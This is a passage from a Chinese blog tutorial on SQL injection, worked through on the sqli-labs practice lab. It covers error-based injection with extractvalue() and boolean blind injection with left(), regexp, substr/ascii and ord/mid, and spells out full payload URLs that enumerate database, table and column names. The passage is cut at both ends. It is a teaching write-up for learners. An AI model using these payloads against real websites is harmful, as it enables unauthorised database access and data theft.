<p> <img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200803184858664.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</li>
<li><p>读取数据库<br> <img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200803185153935.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>读取更多信息查看<a href="https://blog.csdn.net/qq_41860876/article/details/107694026">2. 网易web安全渗透 union联合查询注入</a></p>
</li>
</ol>
<h3 id="extractvalue-函数"><a href="#extractvalue-函数" class="headerlink" title="extractvalue()函数"></a>extractvalue()函数</h3><p>接受两个参数，第一个XML，第二个XPath语句</p>
<p>这个我遇见个问题有的地方运行不起来不知道怎么回事，可能是版本问题还是数据库问题，就不研究了，下面是演示是可以的</p>
<p><strong>下面我输入1和2</strong><br>代码</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> extractvalue(<span class="number">1</span>,<span class="number">2</span>) ;</span><br></pre></td></tr></table></figure>

<p>结果<br>我们输入2他也是认为是XPath语句<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200803182828892.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>我们输入1,’2!’</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> extractvalue(<span class="number">1</span>,<span class="string">&#x27;2!&#x27;</span>) ;</span><br></pre></td></tr></table></figure>
<p>就报错了，!是XPath语句<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/2020080318314676.png" alt="在这里插入图片描述"><br>我们在输入一个语句就被执行了</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> extractvalue(<span class="number">1</span>,(<span class="keyword">select</span> <span class="keyword">user</span>())) ;</span><br></pre></td></tr></table></figure>
<p>结果，输出了<code>@localhost</code><br>我们要的想要的结果是<code>root@localhost</code><br>应为<code>root</code>他认为是合法的，<code>@</code>是不合法的<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/2020080318360045.png" alt="在这里插入图片描述"><br><strong>通过上面的结果就可以用concat()函数进行提前报错，显示完全的</strong><br>代码</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> extractvalue(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="string">&#x27;!&#x27;</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()))) ;</span><br></pre></td></tr></table></figure>
<p>结果<br>叫可以看见叫全部给输出出来了<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200803184018994.png" alt="在这里插入图片描述"><br>可以用16进制进行输入<br>代码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">select extractvalue(1,concat(0x7e,(select user()),0x7e)) ;</span><br></pre></td></tr></table></figure>
<p>结果<code>0x7e就是16进制的~</code></p>
<p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/2020080318435388.png" alt="在这里插入图片描述"></p>
<h4 id="sqli-labs第5关实战-1"><a href="#sqli-labs第5关实战-1" class="headerlink" title="sqli-labs第5关实战"></a>sqli-labs第5关实战</h4><ol>
<li>读取数据<br>URL地址<code>http://192.168.0.104/Less-5/?id=1 &#39;and(select extractvalue(1,concat(0x7e,(select user()),0x7e)))  --+</code> </li>
</ol>
<pre><code>![在这里插入图片描述](https://img-blog.csdnimg.cn/20200803184600561.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70)</code></pre>
<ol start="2">
<li><p>读取数据库<br> URL地址<code>http://192.168.0.104/Less-5/?id=1 &#39;and(select extractvalue(1,concat(0x7e,(select group_concat(schema_name) from information_schema.schemata),0x7e)))  --+</code><br> 他只能读取几个可以用<code>LIMIT</code>进行一个一个查询</p>
<p> <img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200803185528759.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br> 读取更多信息查看<a href="https://blog.csdn.net/qq_41860876/article/details/107694026">2. 网易web安全渗透 union联合查询注入</a></p>
</li>
</ol>
<h3 id="UpdateXML-函数和extractvalue-函数一样就不多解释了"><a href="#UpdateXML-函数和extractvalue-函数一样就不多解释了" class="headerlink" title="UpdateXML()函数和extractvalue()函数一样就不多解释了"></a>UpdateXML()函数和extractvalue()函数一样就不多解释了</h3>]]></content>
      <categories>
        <category>sql注入</category>
      </categories>
      <tags>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>4. 网易web安全渗透， sql 布尔型盲注</title>
    <url>/2020/08/29/4.%20%E7%BD%91%E6%98%93web%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%EF%BC%8C%20sql%20%E5%B8%83%E5%B0%94%E5%9E%8B%E7%9B%B2%E6%B3%A8/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="笔记"><a href="#笔记" class="headerlink" title="笔记"></a>笔记</h2><h2 id="sql注入漏洞布尔型盲注原理"><a href="#sql注入漏洞布尔型盲注原理" class="headerlink" title="sql注入漏洞布尔型盲注原理"></a>sql注入漏洞布尔型盲注原理</h2><h3 id="下面的代码"><a href="#下面的代码" class="headerlink" title="下面的代码"></a>下面的代码</h3><p>不管你输入正确就显示Right，你输入错误显示Wrong没有其他的<br>就是你不管输入什么就有两个结果<br>这个我们就可以通过真和假来判断</p>
<h3 id="他是怎么实现查询数据库的那"><a href="#他是怎么实现查询数据库的那" class="headerlink" title="他是怎么实现查询数据库的那"></a>他是怎么实现查询数据库的那</h3><p>  <strong>zhao</strong><br>这个zhao是数据库名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">我进行猜他一个一个字符的猜他</span><br><span class="line">第一个字符是不是a</span><br><span class="line">返回Wrong</span><br><span class="line"></span><br><span class="line">第一个字符是不是z</span><br><span class="line">返回Right</span><br><span class="line"></span><br><span class="line">第二个字符是不是za</span><br><span class="line">返回Wrong</span><br><span class="line"></span><br><span class="line">第二个字符是不是zh</span><br><span class="line">返回Right</span><br><span class="line"></span><br><span class="line">等等。。。。。。。。</span><br></pre></td></tr></table></figure>

<p>知道猜叫名猜出来</p>
<h2 id="布尔型盲注方法"><a href="#布尔型盲注方法" class="headerlink" title="布尔型盲注方法"></a>布尔型盲注方法</h2><h3 id="left-函数"><a href="#left-函数" class="headerlink" title="left()函数"></a>left()函数</h3><p>left()函数是一个字符串函数，它返回具有指定长度的字符串的左边部分<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200805151723936.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h4 id="left-函数进行注入"><a href="#left-函数进行注入" class="headerlink" title="left()函数进行注入"></a>left()函数进行注入</h4><p><strong>数据库名称dvwa</strong><br>下面这个我用的是 database()查询当前数据库的，<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/2020080515284435.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><strong>判断第一个字符是什么</strong><br>代码</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">left</span>(<span class="keyword">database</span>(),<span class="number">1</span>)=<span class="string">&#x27;d&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>结果<br>结果是d<br>可以看见输入a是错的，输入d是对的<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200805153244203.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><strong>判断第二个字符是什么</strong><br>第一个字符是d<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200805153438597.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>以此类推到最后一个<br>结果就出来了<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200805153556950.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h3 id="regexp函数"><a href="#regexp函数" class="headerlink" title="regexp函数"></a>regexp函数</h3><p>SQL中的正则表达式(regexp)</p>
<h4 id="regexp进行布尔型盲注"><a href="#regexp进行布尔型盲注" class="headerlink" title="regexp进行布尔型盲注"></a>regexp进行布尔型盲注</h4><p><strong>数据库名称dvwa</strong><br>下面这个我用的是 database()查询当前数据库的，<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/2020080515284435.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>下面这个<code>^</code>的意思就是，字符串的起始字符串是什么</p>
<ol>
<li><p><strong>判断第一个字符是什么</strong><br>结果是d</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">database</span>()  regexp <span class="string">&#x27;^d&#x27;</span>; </span><br></pre></td></tr></table></figure>

<p> <img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200805161625488.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</li>
</ol>
<ol start="2">
<li>判断第二个字符是什么<br>结果是v<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/2020080516181824.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
</ol>
<p>以此类推到最后一个<br>结果就出来了</p>
<h3 id="like函数"><a href="#like函数" class="headerlink" title="like函数"></a>like函数</h3><p>就不多说了</p>
<h4 id="进行注入"><a href="#进行注入" class="headerlink" title="进行注入"></a>进行注入</h4><p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200805162204658.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h3 id="substr-函数和ascii-函数"><a href="#substr-函数和ascii-函数" class="headerlink" title="substr()函数和ascii()函数"></a>substr()函数和ascii()函数</h3><p><strong>数据库名称dvwa</strong><br>下面这个我用的是 database()查询当前数据库的，<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/2020080515284435.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<ol>
<li>substr()函数是截取字符串的<br> 看一下代码<code>select substr(&#39;abcdefc&#39;,1,4);</code><br> 意思就是从第1个开始取到第4个<br> 结果<img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200810120447390.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
<li>ascii()就是把字符串转化成ascii码<br> 用这个点原因是避免了<code>&#39;</code>的出现<img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200810120716917.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><h4 id="报错查询"><a href="#报错查询" class="headerlink" title="报错查询"></a>报错查询</h4>代码<code> select ascii(substr((select database()),1,1))=100;</code><br>查询的是dvwa库第一个字符是d的ascii等于100<br>结果是100<img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200810121650984.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
</ol>
<h3 id="ord-函数和mid-函数"><a href="#ord-函数和mid-函数" class="headerlink" title="ord()函数和mid()函数"></a>ord()函数和mid()函数</h3><ol>
<li>ord()和上面的ascii()是一样的<br> 就是把字符串转化成ascii码<br> 用这个点原因是避免了<code>&#39;</code>的出现<br> <img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200810122414136.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
<li>mid()和上面的substr()函数是一样的<br> 意思就是从第1个开始取到第4个<img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200810122656263.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
</ol>
<h4 id="报错查询-1"><a href="#报错查询-1" class="headerlink" title="报错查询"></a>报错查询</h4><p>其实和上面的一样<br>代码<code>select ord(mid((select database()),1,1))=100;</code><br>查询的是dvwa库第一个字符是d的ascii等于100<br>结果是100<img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200810122857937.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><p>第8关</p>
<h3 id="1-判断是否存在sql注入漏洞"><a href="#1-判断是否存在sql注入漏洞" class="headerlink" title="1.判断是否存在sql注入漏洞"></a>1.判断是否存在sql注入漏洞</h3><p>输入<code>http://192.168.0.102/Less-8/?id=1</code><br>显示出<strong>You are in………..</strong><br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200813110150938.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>添加一个<code>&#39;</code><br>输入<code>http://192.168.0.102/Less-8/?id=1&#39;</code><br>发现没有任何显示，可能存在sql注入漏洞<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/2020081311100965.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>在进行判断<br>输入<code>http://192.168.0.102/Less-8/?id=1 &#39; and &#39;1&#39;=&#39;1</code><br>发现正常显示</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200813111203293.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>输入<code>http://192.168.0.102/Less-8/?id=1 &#39; and &#39;1&#39;=&#39;2</code></p>
<p>报错<br>说明是存在sql注入漏洞的</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200813111704607.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<h3 id="2-读取数据"><a href="#2-读取数据" class="headerlink" title="2.  读取数据"></a>2.  读取数据</h3><p>发现他就两个结果，一个正确是输出，一个是错误不输出<br>我们就可以进行布尔盲注、<br>查询其他的比较麻烦这个我就查询当前的库的数据</p>
<ol>
<li><p>查询当前的库名<br> <strong>下面演示的事left函数进行查询的</strong></p>
<p> URL地址<code>http://192.168.0.102/Less-8/?id=1&#39; and left(database(),1)=&#39;s&#39; --+</code><br> 结果是s<br> 输入a没有显示没有显示<img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200813121603775.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>输入s都显示了<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/2020081312253892.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
</li>
</ol>
<pre><code>**查询第二个**</code></pre>
<p>URL地址<code>http://192.168.0.102/Less-8/?id=1&#39; and left(database(),2)=&#39;se‘ --+</code><br>结果是e<br>输入a没有显示<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200813122356678.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<pre><code>输入e显示了说明就是e</code></pre>
<p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200813122341294.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>还可以用burp进行查询方便<br>直接就可以查询出来<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200813123547241.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>其他函数查询方法</p>
<pre><code><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">regexp函数</span><br><span class="line">http://192.168.0.102/Less-8/?id=1&#x27; and  database()  regexp &#x27;^s&#x27; <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line">	like函数</span><br><span class="line">http://192.168.0.102/Less-8/?id=1&#x27; and  database()  like &#x27;d%&#x27; <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line">substr()函数和ascii()函数	</span><br><span class="line">http://192.168.0.102/Less-8/?id=1&#x27; and  ascii(substr((<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">115</span>  <span class="comment">--+</span></span><br><span class="line"> </span><br><span class="line">	<span class="keyword">ord</span>()函数和<span class="keyword">mid</span>()函数</span><br><span class="line"><span class="keyword">http</span>://<span class="number">192.168</span><span class="number">.0</span><span class="number">.102</span>/<span class="keyword">Less</span><span class="number">-8</span>/?<span class="keyword">id</span>=<span class="number">1</span><span class="string">&#x27; and  ord(mid((select database()),1,1))=115  --+ </span></span><br></pre></td></tr></table></figure></code></pre>
<p>以此类推找到数据库名是<code>security</code>其他的库就不查询</p>
<ol start="2">
<li><p>查询表<br>上面已经叫库明查询出来了<br><strong>下面演示的事left函数进行查询的</strong><br>URL地址<code>http://192.168.0.102/Less-8/ ?id=1&#39; and left((select table_name from information_schema.tables where table_schema=&#39;security&#39; LIMIT 0,1) ,1)=&#39;e&#39; --+  </code><br>结果是e<br>输入a没有显示<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200813130513707.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>输入e就显示了说明第一个字符是e</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200813130458144.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
</li>
</ol>
<p><strong>查询第二个</strong><br>URL地址<code>http://192.168.0.102/Less-8/ ?id=1&#39; and left((select table_name from information_schema.tables where table_schema=&#39;security&#39; LIMIT 0,1) ,2)=&#39;ea&#39; --+ </code><br>结果是m<br>输入a没有显示<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200813130704167.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>输入m就显示了<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/2020081313081453.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>用burp进行查询提升速度<br>是a<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200813131304868.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>    其他函数查询</p>
<pre><code><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">regexp函数</span><br><span class="line">http://192.168.0.102/Less-8/?id=1&#x27; and (<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">&#x27;security&#x27;</span> <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span>)  regexp <span class="string">&#x27;^e&#x27;</span> <span class="comment">--+查询到emails</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">like</span>函数</span><br><span class="line"><span class="keyword">http</span>://<span class="number">192.168</span><span class="number">.0</span><span class="number">.102</span>/<span class="keyword">Less</span><span class="number">-8</span>/?<span class="keyword">id</span>=<span class="number">1</span><span class="string">&#x27; and  (select table_name from information_schema.tables where table_schema=&#x27;</span><span class="keyword">security</span><span class="string">&#x27; LIMIT 0,1)  like &#x27;</span>e%<span class="string">&#x27; --+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">substr()函数和ascii()函数	</span></span><br><span class="line"><span class="string">http://192.168.0.102/Less-8/?id=1&#x27;</span> <span class="keyword">and</span>  <span class="keyword">ascii</span>(<span class="keyword">substr</span>((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">&#x27;security&#x27;</span> <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span>) ,<span class="number">1</span>,<span class="number">1</span>))=<span class="number">101</span>  <span class="comment">--+</span></span><br><span class="line"> </span><br><span class="line">	<span class="keyword">ord</span>()函数和<span class="keyword">mid</span>()函数</span><br><span class="line"><span class="keyword">http</span>://<span class="number">192.168</span><span class="number">.0</span><span class="number">.102</span>/<span class="keyword">Less</span><span class="number">-8</span>/?<span class="keyword">id</span>=<span class="number">1</span><span class="string">&#x27; and  ord(mid((select table_name from information_schema.tables where table_schema=&#x27;</span><span class="keyword">security</span><span class="string">&#x27; LIMIT 0,1),1,1))=101  --+ </span></span><br></pre></td></tr></table></figure>
以此类推叫第一个给查询出来了`emails`其他的表就不查询</code></pre>
<ol start="3">
<li><p>查询列<br> 上面我已经第一个给查询出来了<code>emails</code> 利用这个查询列<br> <strong>下面演示的事left函数进行查询的</strong><br> URL地址<code>http://192.168.0.102/Less-8/?id=1&#39; and left((select column_name from information_schema.columns where table_name=&#39;emails&#39; LIMIT 0,1),1)=&#39;i&#39; --+ </code><br> 结果是i<br> 输入a没有显示<br> <img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200813132839338.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>输入i就显示了<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200813133035958.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>查询第二个字符<br>URL地址<code>http://192.168.0.102/Less-8/?id=1&#39; and left((select column_name from information_schema.columns where table_name=&#39;emails&#39; LIMIT 0,1),2)=&#39;id&#39; --+</code><br>结果是d<br>输入a没有显示<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200813133124609.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>输入d显示了<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200813133221111.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>用burp就不演示了<br>其他函数查询方法</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">regexp函数</span><br><span class="line">http://192.168.0.102/Less-8/?id=1&#x27; and  (<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">&#x27;emails&#x27;</span> <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span>)  regexp <span class="string">&#x27;^i&#x27;</span> <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">like</span>函数</span><br><span class="line"><span class="keyword">http</span>://<span class="number">192.168</span><span class="number">.0</span><span class="number">.102</span>/<span class="keyword">Less</span><span class="number">-8</span>/?<span class="keyword">id</span>=<span class="number">1</span><span class="string">&#x27; and  (select column_name from information_schema.columns where table_name=&#x27;</span>emails<span class="string">&#x27; LIMIT 0,1)  like &#x27;</span>i%<span class="string">&#x27; --+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">substr()函数和ascii()函数	</span></span><br><span class="line"><span class="string">http://192.168.0.102/Less-8/?id=1&#x27;</span> <span class="keyword">and</span>  <span class="keyword">ascii</span>(<span class="keyword">substr</span>((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">&#x27;emails&#x27;</span> <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span 